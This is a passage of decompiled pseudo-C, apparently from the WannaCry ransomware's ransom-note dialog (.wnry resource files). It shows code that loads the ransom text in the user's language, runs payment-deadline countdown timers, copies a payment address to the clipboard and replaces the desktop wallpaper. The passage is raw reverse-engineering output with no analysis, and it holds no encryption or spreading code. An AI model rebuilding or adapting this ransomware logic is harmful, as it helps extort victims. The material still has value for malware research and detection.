  pHVar1 = LoadIconA((HINSTANCE)hInstance,lpIconName);
  *(HICON *)((int)this + 0x82c) = pHVar1;
  *(undefined4 *)((int)this + 0x824) = 0;
  *(undefined4 *)((int)this + 0x828) = 0;
  *(undefined4 *)((int)this + 0x818) = 0;
  operator_((CString *)((int)this + 0x81c),(char *)&this_00421798);
  *(undefined4 *)((int)this + 0x820) = 0;
  *in_FS_OFFSET = local_c;
  return (undefined4 *)this;
}

CDialog * __thiscall FUN_00406380(void *this,byte param_1)

{
  FUN_00405e10((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}

void __thiscall FUN_004063a0(void *this,CDataExchange *param_1)

{
  DDX_Control(param_1,0x40f,(CWnd *)((int)this + 0x60));
  DDX_Control(param_1,0x3ec,(CWnd *)((int)this + 0xa0));
  DDX_Control(param_1,0x3eb,(CWnd *)((int)this + 0xe0));
  DDX_Control(param_1,0x3f3,(CWnd *)((int)this + 0x120));
  DDX_Control(param_1,0x3f4,(CWnd *)((int)this + 0x1a4));
  DDX_Control(param_1,0x3f5,(CWnd *)((int)this + 0x228));
  DDX_Control(param_1,0x3f2,(CWnd *)((int)this + 0x290));
  DDX_Control(param_1,0x3ee,(CWnd *)((int)this + 0x2f8));
  DDX_Control(param_1,0x3f9,(CWnd *)((int)this + 0x360));
  DDX_Control(param_1,0x401,(CWnd *)((int)this + 0x3c8));
  DDX_Control(param_1,0x3fd,(CWnd *)((int)this + 0x444));
  DDX_Control(param_1,1000,(CWnd *)((int)this + 0x4c0));
  DDX_Text(param_1,0x3ff,(CString *)((int)this + 0x500));
  DDX_Text(param_1,0x3fc,(CString *)((int)this + 0x504));
  DDX_Text(param_1,0x3ef,(CString *)((int)this + 0x508));
  return;
}

BOOL __thiscall FUN_00406940(void *this,CDC *param_1)

{
  CBrush *pCVar1;
  BOOL BVar2;
  undefined4 *in_FS_OFFSET;
  undefined **local_24 [2];
  tagRECT local_1c;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413e30;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  GetClientRect(*(HWND *)((int)this + 0x20),(LPRECT)&local_1c);
  CBrush((CBrush *)local_24,*(ulong *)((int)this + 0x824));
  local_4 = 0;
  pCVar1 = SelectObject(param_1,(CBrush *)local_24);
  BVar2 = PatBlt(*(HDC *)(param_1 + 4),0,0,local_1c.right - local_1c.left,
                 local_1c.bottom - local_1c.top,0xf00021);
  SelectObject(param_1,pCVar1);
  local_24[0] = &PTR_LAB_00415c00;
  local_4 = 1;
  DeleteObject((CGdiObject *)local_24);
  *in_FS_OFFSET = local_c;
  return BVar2;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00406ae0(void *param_1)

{
  CString CVar1;
  char *extraout_EAX;
  undefined3 extraout_var;
  DWORD DVar2;
  char *extraout_EAX_00;
  undefined3 extraout_var_00;
  undefined4 local_120;
  uint *in_FS_OFFSET;
  char *pcVar3;
  CString local_11c [4];
  CString local_118 [4];
  CString local_114 [260];
  uint uStack16;
  uint local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  local_8 = &param_1_00413e61;
  local_c = *in_FS_OFFSET;
  *(uint **)in_FS_OFFSET = &local_c;
  CString(local_11c);
  local_4 = 0;
  GetWindowTextA((CWnd *)((int)param_1 + 0x60),local_11c);
  CString(local_114,(char *)&this_004210e4);
  pcVar3 = s_m__s_wnry_004210d8;
  local_4 = CONCAT31(local_4._1_3_,1);
  CVar1 = operator_(local_118,extraout_EAX);
  sprintf((char *)local_114,*(char **)CONCAT31(extraout_var,CVar1),local_120,pcVar3);
  _CString(local_11c);
  local_8 = (undefined *)((uint)local_8 & 0xffffff00);
  _CString(local_118);
  DVar2 = GetFileAttributesA((LPCSTR)local_114);
  if (DVar2 == 0xffffffff) {
    CString(local_11c,(char *)&this_004210e4);
    pcVar3 = s_m__s_wnry_004210d8;
    local_8 = (undefined *)CONCAT31(local_8._1_3_,2);
    CVar1 = operator_(local_118,extraout_EAX_00);
    sprintf((char *)local_118,*(char **)CONCAT31(extraout_var_00,CVar1),s_English_004210d0,pcVar3);
    _CString(local_11c);
    local_c = local_c & 0xffffff00;
    _CString((CString *)&stack0xfffffee0);
  }
  FUN_00406cf0(param_1,(char *)local_114);
  local_8 = (undefined *)0xffffffff;
  _CString((CString *)&stack0xfffffee0);
  *in_FS_OFFSET = uStack16;
  return;
}

void __fastcall FUN_00406c20(void *param_1)

{
  char cVar1;
  LANGID LVar2;
  LRESULT LVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  undefined4 *puVar7;
  char *pcVar8;
  char *pcVar9;
  undefined4 *puVar10;
  undefined local_34 [52];
  
  iVar4 = 0xc;
  local_34[0] = '\0';
  puVar7 = (undefined4 *)(local_34 + 1);
  while (iVar4 != 0) {
    iVar4 = iVar4 + -1;
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined *)puVar7 = 0;
  LVar2 = GetUserDefaultLangID();
  iVar4 = GetLocaleInfoA((uint)LVar2,0x1001,local_34,0x32);
  if (iVar4 == 0) {
    uVar5 = 0xffffffff;
    pcVar8 = s_English_004210d0;
    do {
      pcVar9 = pcVar8;
      if (uVar5 == 0) break;
      uVar5 = uVar5 - 1;
      pcVar9 = pcVar8 + 1;
      cVar1 = *pcVar8;
      pcVar8 = pcVar9;
    } while (cVar1 != '\0');
    uVar5 = ~uVar5;
    uVar6 = uVar5 >> 2;
    puVar7 = (undefined4 *)(pcVar9 + -uVar5);
    puVar10 = (undefined4 *)local_34;
    while (uVar6 != 0) {
      uVar6 = uVar6 - 1;
      *puVar10 = *puVar7;
      puVar7 = puVar7 + 1;
      puVar10 = puVar10 + 1;
    }
    uVar5 = uVar5 & 3;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *(undefined *)puVar10 = *(undefined *)puVar7;
      puVar7 = (undefined4 *)((int)puVar7 + 1);
      puVar10 = (undefined4 *)((int)puVar10 + 1);
    }
  }
  LVar3 = SendMessageA(*(HWND *)((int)param_1 + 0x80),0x158,0,(LPARAM)local_34);
  if (LVar3 == -1) {
    SendMessageA(*(HWND *)((int)param_1 + 0x80),0x14e,0,0);
    FUN_00406ae0(param_1);
    return;
  }
  SendMessageA(*(HWND *)((int)param_1 + 0x80),0x14d,0,(LPARAM)local_34);
  FUN_00406ae0(param_1);
  return;
}

void __thiscall FUN_00406cf0(void *this,char *param_1)

{
  HWND hWnd;
  undefined4 *in_FS_OFFSET;
  CFile *local_28 [2];
  undefined *local_20;
  CFile local_1c [16];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413e78;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  hWnd = (HWND)((int)this + 0x4c0);
  if (hWnd != (HWND)0x0) {
    hWnd = *(HWND *)((int)this + 0x4e0);
  }
  SendMessageA(hWnd,0x445,0,0x4000000);
  CFile(local_1c,param_1,0);
  local_28[0] = local_1c;
  local_4 = 0;
  local_20 = &LAB_00406da0;
  SendMessageA(*(HWND *)((int)this + 0x4e0),0x449,2,(LPARAM)local_28);
  Close(local_1c);
  FUN_00406dc0((int)this);
  local_4 = 0xffffffff;
  _CFile(local_1c);
  *in_FS_OFFSET = local_c;
  return;
}

void __fastcall FUN_00406dc0(int param_1)

{
  LRESULT LVar1;
  HWND hWnd;
  int iVar2;
  int iVar3;
  int iVar4;
  int local_68;
  int local_64;
  undefined4 local_60;
  LRESULT local_5c;
  void *local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  
  iVar4 = 0;
  LVar1 = SendMessageA(*(HWND *)(param_1 + 0x4e0),0xe,0,0);
  local_60 = 0;
  local_5c = LVar1;
  local_58 = operator_new(LVar1 + 1);
  if (local_58 != (void *)0x0) {
    if (param_1 == -0x4c0) {
      hWnd = (HWND)0x0;
    }
    else {
      hWnd = *(HWND *)(param_1 + 0x4e0);
    }
    SendMessageA(hWnd,1099,0,(LPARAM)&local_60);
    *(undefined *)((int)local_58 + LVar1) = 0;
    if (-1 < LVar1) {
      do {
        iVar2 = _strnicmp((char *)(iVar4 + (int)local_58),s__http____004210f8,8);
        if ((iVar2 == 0) ||
           (iVar3 = _strnicmp((char *)(iVar4 + (int)local_58),s__https____004210ec,9), iVar2 = iVar4
           , iVar3 == 0)) {
          iVar3 = iVar4 + 1;
          while (iVar2 = iVar3, iVar3 <= LVar1) {
            if (*(char *)(iVar3 + (int)local_58) == '>') {
              iVar2 = iVar3 + 1;
              if (iVar3 != -1) {
                local_68 = iVar4 + 1;
                local_64 = iVar3;
                SendMessageA(*(HWND *)(param_1 + 0x4e0),0x437,0,(LPARAM)&local_68);
                local_54 = 0x54;
                local_4c = 0x20;
                local_50 = 0x20;
                SetSelectionCharFormat((CRichEditCtrl *)(param_1 + 0x4c0),(_charformat *)&local_54);
              }
              break;
            }
            iVar3 = iVar3 + 1;
          }
        }
        iVar4 = iVar2 + 1;
      } while (iVar4 <= LVar1);
    }
    operator_delete(local_58);
  }
  return;
}

void __thiscall FUN_00406f80(void *this,undefined4 param_1,undefined param_2,undefined4 param_3)

{
  void *this_00;
  HBRUSH pHVar1;
  HFONT pHVar2;
  CWnd *pCVar3;
  CString extraout_CL;
  CString extraout_CL_00;
  WPARAM wParam;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  CGdiObject *this_01;
  CGdiObject *this_02;
  int unaff_ESI;
  undefined4 unaff_EDI;
  CGdiObject *this_03;
  undefined4 *in_FS_OFFSET;
  CString CVar4;
  CString CVar5;
  CString CVar6;
  CString local_e0 [4];
  undefined *local_dc;
  undefined *local_d8;
  undefined *local_d4;
  undefined local_d0 [4];
  undefined local_cc [2];
  ushort uStack202;
  ushort uStack198;
  undefined local_c0 [4];
  undefined local_bc [12];
  undefined local_b0 [4];
  undefined local_ac [160];
  undefined4 uStack12;
  void **ppvStack8;
  undefined4 local_4;
  
  CVar6 = SUB41(unaff_ESI,0);
  CVar5 = SUB41(unaff_EDI,0);
  uStack12 = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  ppvStack8 = &param_1_00413e9b;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  FUN_004076a0(this,0,unaff_EDI,unaff_ESI);
  pHVar1 = CreateSolidBrush(0xe0);
  Attach((CGdiObject *)((int)this + 0x830),pHVar1);
  pHVar1 = CreateSolidBrush(0x121284);
  Attach((CGdiObject *)((int)this + 0x838),pHVar1);
  pHVar1 = CreateSolidBrush(0xe000);
  Attach((CGdiObject *)((int)this + 0x840),pHVar1);
  pHVar1 = CreateSolidBrush(0xe00000);
  Attach((CGdiObject *)((int)this + 0x848),pHVar1);
  pHVar1 = CreateSolidBrush(0);
  Attach((CGdiObject *)((int)this + 0x850),pHVar1);
  pHVar1 = CreateSolidBrush(0x3834d1);
  Attach((CGdiObject *)((int)this + 0x858),pHVar1);
  pHVar1 = CreateSolidBrush(0x107c10);
  Attach((CGdiObject *)((int)this + 0x860),pHVar1);
  pHVar1 = CreateSolidBrush(0xe8a200);
  Attach((CGdiObject *)((int)this + 0x868),pHVar1);
  pHVar1 = CreateSolidBrush(0xd77800);
  Attach((CGdiObject *)((int)this + 0x870),pHVar1);
  pHVar1 = CreateSolidBrush(0x3cda);
  Attach((CGdiObject *)((int)this + 0x878),pHVar1);
  this_03 = (CGdiObject *)((int)this + 0x880);
  pHVar2 = CreateFontA(0x18,0,0,0,700,0,0,0,0,0,0,0,0x20,s_Arial_004206d8);
  Attach(this_03,pHVar2);
  this_01 = (CGdiObject *)((int)this + 0x888);
  pHVar2 = CreateFontA(0x12,0,0,0,700,0,0,0,0,0,0,0,0x20,s_Arial_004206d8);
  Attach(this_01,pHVar2);
  this_02 = (CGdiObject *)((int)this + 0x890);
  pHVar2 = CreateFontA(0x10,0,0,0,700,0,0,0,0,0,0,0,0x20,s_Arial_004206d8);
  Attach(this_02,pHVar2);
  pCVar3 = GetDlgItem((CWnd *)this,0x3ed);
  if (this_03 != (CGdiObject *)0x0) {
    this_03 = *(CGdiObject **)((int)this + 0x884);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,(WPARAM)this_03,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3fe);
  if (this_01 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x88c);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3fb);
  if (this_01 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x88c);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3ff);
  if (this_02 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x894);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3fc);
  if (this_02 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x894);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x400);
  if (this_02 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x894);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3fa);
  if (this_02 != (CGdiObject *)0x0) {
    this_02 = *(CGdiObject **)((int)this + 0x894);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,(WPARAM)this_02,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x402);
  if (this_01 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x88c);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3ef);
  if (this_01 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x88c);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3eb);
  if (this_01 == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)((int)this + 0x88c);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)this,0x3ec);
  if (this_01 != (CGdiObject *)0x0) {
    this_01 = *(CGdiObject **)((int)this + 0x88c);
  }
  local_d8 = &stack0xffffff10;
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,(WPARAM)this_01,1);
  operator_((CString *)((int)this + 0x508),(char *)((int)this + 0x5be));
  FUN_00404260((void *)((int)this + 0x228),*(uint *)((int)this + 0x824) ^ 0xffffff);
  FUN_00404260((void *)((int)this + 0x290),*(uint *)((int)this + 0x824) ^ 0xffffff);
  this_00 = (void *)((int)this + 0x2f8);
  FUN_00404260(this_00,*(uint *)((int)this + 0x824) ^ 0xffffff);
  FUN_00404260((void *)((int)this + 0x360),*(uint *)((int)this + 0x824) ^ 0xffffff);
  local_dc = &stack0xffffff0c;
  CVar4 = extraout_CL;
  CString((CString *)&stack0xffffff0c,s_https___en_wikipedia_org_wiki_Bi_0042119c);
  FUN_00404210((int)this + 0x228,extraout_DL,CVar4);
  local_dc = &stack0xffffff0c;
  CVar4 = extraout_CL_00;
  CString((CString *)&stack0xffffff0c,s_https___www_google_com_search_q__00421168);
  FUN_00404210((int)this + 0x290,extraout_DL_00,CVar4);
  CString(local_e0);
  local_4 = 0;
  Format(local_e0,(char *)local_e0);
  CString((CString *)&stack0xffffff10,(CString *)&local_dc);
  FUN_00404210((int)this_00,extraout_DL_01,CVar5);
  FUN_00404270(this_00,(CGdiObject *)((int)this + 0x888));
  Format((CString *)&local_dc,(char *)&local_dc);
  local_d4 = &stack0xffffff14;
  CString((CString *)&stack0xffffff14,(CString *)&local_d8);
  FUN_00404210((int)this + 0x360,extraout_DL_02,CVar6);
  SendMessageA(*(HWND *)((int)this + 0x140),0x406,0,100);
  SendMessageA(*(HWND *)((int)this + 0x1c4),0x406,0,100);
  SetSize((CDWordArray *)((int)this + 0x160),2,-1);
  **(undefined4 **)((int)this + 0x164) = 0xe0;
  *(undefined4 *)(*(int *)((int)this + 0x164) + 4) = 0xe000;
  SetSize((CDWordArray *)((int)this + 0x1e4),2,-1);
  **(undefined4 **)((int)this + 0x1e8) = 0xe0;
  *(undefined4 *)(*(int *)((int)this + 0x1e8) + 4) = 0xe000;
  this_00 = (void *)((int)this + 0x3c8);
  FUN_00405820(this_00,1);
  FUN_00405800(this_00,0xb);
  FUN_00405200(this_00,0);
  FUN_00405920(this_00,*(undefined4 *)((int)this + 0x824),0xffffff,
               *(undefined4 *)((int)this + 0x824));
  FUN_00405860(this_00,0xb);
  FUN_004058c0(this_00,1);
  FUN_00405990(this_00,1,0x20);
  FUN_00405180(this_00,(uchar *)&DAT_0042111c);
  this_00 = (void *)((int)this + 0x444);
  FUN_00405820(this_00,1);
  FUN_00405800(this_00,0xb);
  FUN_00405200(this_00,0);
  FUN_00405920(this_00,*(undefined4 *)((int)this + 0x824),0xffffff,
               *(undefined4 *)((int)this + 0x824));
  FUN_00405860(this_00,0xb);
  FUN_004058c0(this_00,1);
  FUN_00405990(this_00,1,0x20);
  FUN_00405180(this_00,(uchar *)&DAT_0042111c);
  GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)local_b0);
  FUN_00401e60(*(int *)((int)this + 0x57c) * 0x15180 + *(int *)((int)this + 0x578),local_c0);
  SystemTimeToTzSpecificLocalTime
            ((TIME_ZONE_INFORMATION *)local_b0,(SYSTEMTIME *)local_c0,(LPSYSTEMTIME)local_d0);
  Format((CString *)(uint)uStack202,(char *)((int)this + 0x500));
  FUN_00401e60(*(int *)((int)this + 0x580) * 0x15180 + *(int *)((int)this + 0x578),local_bc);
  SystemTimeToTzSpecificLocalTime
            ((TIME_ZONE_INFORMATION *)(local_b0 + 4),(SYSTEMTIME *)local_bc,
             (LPSYSTEMTIME)(local_d0 + 4));
  Format((CString *)(uint)uStack198,(char *)((int)this + 0x504));
  UpdateData((CWnd *)this,0);
  _CString((CString *)local_d0);
  *in_FS_OFFSET = param_1;
  return;
}

void __fastcall FUN_00407640(undefined4 *param_1)

{
  *param_1 = 0x415c00;
  param_1[1] = 0;
  return;
}

// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_004076a0(void *this,undefined4 param_1,undefined4 param_2,int param_3)

{
  float fVar1;
  short sVar2;
  uint uVar3;
  WPARAM WVar4;
  CWnd *this_00;
  int iVar5;
  void *this_01;
  CString *this_02;
  CString *this_03;
  int iVar6;
  undefined4 *puVar7;
  undefined4 *in_FS_OFFSET;
  time_t tVar8;
  CString local_98 [4];
  undefined8 local_94;
  WPARAM local_8c;
  WPARAM local_88;
  undefined4 local_84;
  ushort local_7a;
  ushort uStack120;
  ushort local_76;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64 [22];
  undefined4 uStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413ebb;
  uStack12 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  local_94 = 0.00000000;
  local_8c = 0;
  local_88 = 0;
  iVar6 = 0;
  do {
    uVar3 = 0;
    tVar8 = time((time_t *)0x0);
    local_6c = DAT_00421120;
    local_70 = DAT_0042111c;
    local_68 = DAT_00421124;
    iVar5 = 0x16;
    local_84 = 0;
    puVar7 = local_64;
    while (iVar5 != 0) {
      iVar5 = iVar5 + -1;
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    if (iVar6 == 0) {
      iVar5 = *(int *)((int)this + 0x57c);
    }
    else {
      iVar5 = *(int *)((int)this + 0x580);
    }
    if (*(int *)((int)this + 0x578) < (int)tVar8) {
      uVar3 = (*(int *)((int)this + 0x578) - (int)tVar8) + iVar5 * 0x15180;
      if ((int)uVar3 < 1) {
        WVar4 = 0;
      }
      else {
        WVar4 = (int)(uVar3 * 100) / (iVar5 * 0x15180);
      }
      if ((int)uVar3 < 0) {
        uVar3 = 0;
      }
    }
    else {
      WVar4 = 0;
    }
    if (iVar6 == 0) {
      local_94 = (double)((ulonglong)local_94 & 0xffffffff00000000 | (ulonglong)uVar3);
      local_8c = WVar4;
      WVar4 = local_88;
    }
    local_88 = WVar4;
    sVar2 = (short)((int)uVar3 >> 0x1f);
    local_7a = ((short)((int)uVar3 / 0x15180) + sVar2) -
               ((short)((int)uVar3 / 0x15180) + sVar2 >> 0xf);
    iVar5 = uVar3 + (uint)local_7a * -0x15180;
    sVar2 = (short)(iVar5 >> 0x1f);
    uStack120 = ((short)(iVar5 / 0xe10) + sVar2) - ((short)(iVar5 / 0x1c200) + sVar2 >> 0xf);
    iVar5 = iVar5 + (uint)uStack120 * -0xe10;
    sVar2 = (short)(iVar5 >> 0x1f);
    local_76 = ((short)(iVar5 / 0x3c) + sVar2) - ((short)(iVar5 / 0x1e000) + sVar2 >> 0xf);
    sprintf((char *)&local_70,s__02d__02d__02d__02d_00421220,(uint)local_7a,(uint)uStack120,
            (uint)local_76,iVar5 + (uint)local_76 * -0x3c);
    if (iVar6 == 0) {
      this_01 = (void *)((int)this + 0x3c8);
    }
    else {
      this_01 = (void *)((int)this + 0x444);
    }
    FUN_00405180(this_01,(uchar *)&local_70);
    iVar6 = iVar6 + 1;
  } while (iVar6 < 2);
  SendMessageA(*(HWND *)((int)this + 0x140),0x402,local_8c,0);
  SendMessageA(*(HWND *)((int)this + 0x1c4),0x402,local_88,0);
  CString(local_98);
  local_4 = 0;
  fVar1 = *(float *)((int)this + 0x584);
  if ((int)local_94 < 1) {
    fVar1 = fVar1 + fVar1;
    *(undefined4 *)((int)this + 0x818) = 1;
  }
  if (*(int *)((int)this + 0x588) == 0) {
    _ftol();
    Format((CString *)((int)this + 0x81c),(char *)(CString *)((int)this + 0x81c));
    Format(this_03,(char *)&local_94);
  }
  else {
    local_94 = (double)fVar1;
    Format(this_02,(char *)((int)this + 0x81c));
    Format((CString *)&local_94,(char *)&local_94);
  }
  this_00 = GetDlgItem((CWnd *)this,0x402);
  SetWindowTextA(this_00,local_94._4_4_);
  iVar6 = *(int *)((int)this + 0x824);
  *(undefined4 *)((int)this + 0x824) = 0x121284;
  if ((iVar6 != 0x121284) && (FUN_004079c0((int)this), param_3 != 0)) {
    InvalidateRect(*(HWND *)((int)this + 0x20),(RECT *)0x0,1);
    FUN_00405920((void *)((int)this + 0x3c8),*(undefined4 *)((int)this + 0x824),0xffffff,
                 *(undefined4 *)((int)this + 0x824));
    FUN_00405920((void *)((int)this + 0x444),*(undefined4 *)((int)this + 0x824),0xffffff,
                 *(undefined4 *)((int)this + 0x824));
  }
  _CString((CString *)((int)&local_94 + 4));
  *in_FS_OFFSET = local_4;
  return;
}

void __fastcall FUN_004079c0(int param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 0x824);
  if (uVar1 < 0x107c11) {
    if (uVar1 == 0x107c10) {
      *(int *)(param_1 + 0x828) = param_1 + 0x860;
      return;
    }
    if (uVar1 < 0x3cdb) {
      if (uVar1 == 0x3cda) {
        *(int *)(param_1 + 0x828) = param_1 + 0x878;
        return;
      }
      if (uVar1 == 0) {
        *(int *)(param_1 + 0x828) = param_1 + 0x850;
        return;
      }
      if (uVar1 == 0xe0) {
        *(int *)(param_1 + 0x828) = param_1 + 0x830;
        return;
      }
    }
    else {
      if (uVar1 == 0xe000) {
        *(int *)(param_1 + 0x828) = param_1 + 0x840;
        return;
      }
    }
  }
  else {
    if (uVar1 < 0xd77801) {
      if (uVar1 == 0xd77800) {
        *(int *)(param_1 + 0x828) = param_1 + 0x870;
        return;
      }
      if (uVar1 == 0x121284) {
        *(int *)(param_1 + 0x828) = param_1 + 0x838;
        return;
      }
      if (uVar1 == 0x3834d1) {
        *(int *)(param_1 + 0x828) = param_1 + 0x858;
        return;
      }
    }
    else {
      if (uVar1 == 0xe8a200) {
        *(int *)(param_1 + 0x828) = param_1 + 0x868;
        return;
      }
    }
  }
  *(int *)(param_1 + 0x828) = param_1 + 0x850;
  return;
}

void __fastcall FUN_00407c30(int param_1)

{
  BOOL BVar1;
  HGLOBAL hMem;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
  BVar1 = OpenClipboard(*(HWND *)(param_1 + 0x20));
  if (BVar1 != 0) {
    hMem = GlobalAlloc(2,*(int *)(*(int *)(param_1 + 0x508) + -8) + 1);
    if (hMem == (HGLOBAL)0x0) {
      CloseClipboard();
      return;
    }
    EmptyClipboard();
    puVar4 = *(undefined4 **)(param_1 + 0x508);
    uVar3 = puVar4[-2] + 1;
    puVar5 = (undefined4 *)GlobalLock(hMem);
    uVar2 = uVar3 >> 2;
    while (uVar2 != 0) {
      uVar2 = uVar2 - 1;
      *puVar5 = *puVar4;
      puVar4 = puVar4 + 1;
      puVar5 = puVar5 + 1;
    }
    uVar3 = uVar3 & 3;
    while (uVar3 != 0) {
      uVar3 = uVar3 - 1;
      *(undefined *)puVar5 = *(undefined *)puVar4;
      puVar4 = (undefined4 *)((int)puVar4 + 1);
      puVar5 = (undefined4 *)((int)puVar5 + 1);
    }
    GlobalUnlock(hMem);
    SetClipboardData(1,hMem);
    CloseClipboard();
  }
  return;
}

// WARNING: Could not reconcile some variable overlaps

void FUN_00407cb0(void)

{
  undefined4 *in_FS_OFFSET;
  CDialog local_104 [96];
  CListCtrl local_a4 [64];
  CComboBox local_64 [64];
  undefined **local_24 [3];
  undefined **local_18 [3];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &this_00413f77;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_004030e0(local_104,(CWnd *)0x0);
  local_4 = 0;
  DoModal(local_104);
  local_18[0] = &PTR_LAB_00415c00;
  local_4._0_1_ = 5;
  local_4._1_3_ = 0;
  DeleteObject((CGdiObject *)local_18);
  local_18[0] = &PTR_LAB_00415bec;
  local_24[0] = &PTR_LAB_00415c00;
  local_4._0_1_ = 6;
  DeleteObject((CGdiObject *)local_24);
  local_24[0] = &PTR_LAB_00415bec;
  local_4._0_1_ = 2;
  _CComboBox(local_64);
  local_4 = CONCAT31(local_4._1_3_,1);
  _CListCtrl(local_a4);
  local_4 = 0xffffffff;
  _CDialog(local_104);
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00407db0(void)

{
  undefined4 *in_FS_OFFSET;
  time_t tVar1;
  CDialog local_c4 [96];
  CProgressCtrl local_64 [64];
  undefined4 local_24;
  undefined4 local_20;
  int local_1c;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413fa6;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_00401000(local_c4,(CWnd *)0x0);
  local_4 = 0;
  tVar1 = time((time_t *)0x0);
  if ((int)tVar1 - DAT_004218a0 < 300) {
    local_24 = 0;
  }
  local_20 = 0;
  DoModal(local_c4);
  if (-1 < local_1c) {
    tVar1 = time((time_t *)0x0);
    DAT_004218a0 = (int)tVar1;
  }
  _DAT_004218a4 = _DAT_004218a4 + 1;
  local_4 = 1;
  _CProgressCtrl(local_64);
  local_4 = 0xffffffff;
  _CDialog(local_c4);
  *in_FS_OFFSET = local_c;
  return;
}

void FUN_00407e80(void)

{
  size_t sVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined2 *puStack1568;
  undefined2 local_618;
  undefined4 local_616 [124];
  wchar_t awStack1060 [10];
  undefined2 local_410;
  undefined4 local_40e [127];
  WCHAR aWStack528 [4];
  undefined2 local_208;
  undefined4 local_206 [129];
  
  iVar2 = 0x81;
  local_410 = DAT_0042179c;
  puVar3 = local_40e;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  iVar2 = 0x81;
  local_618 = DAT_0042179c;
  puVar3 = local_616;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  iVar2 = 0x81;
  local_208 = DAT_0042179c;
  puVar3 = local_206;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  puStack1568 = &local_410;
  SHGetFolderPathW(0);
  sVar1 = wcslen(awStack1060);
  if (sVar1 == 0) {
    return;
  }
  swprintf((wchar_t *)&stack0xfffff9d4,(size_t)u__s__s_004201a0,awStack1060);
  MultiByteToWideChar(0,0,s_b_wnry_0042123c,-1,aWStack528,0x103);
  CopyFileW(aWStack528,(LPCWSTR)&puStack1568,0);
  SystemParametersInfoW(0x14,0,&puStack1568,1);
  return;
}

void __fastcall FUN_00407f80(int param_1)

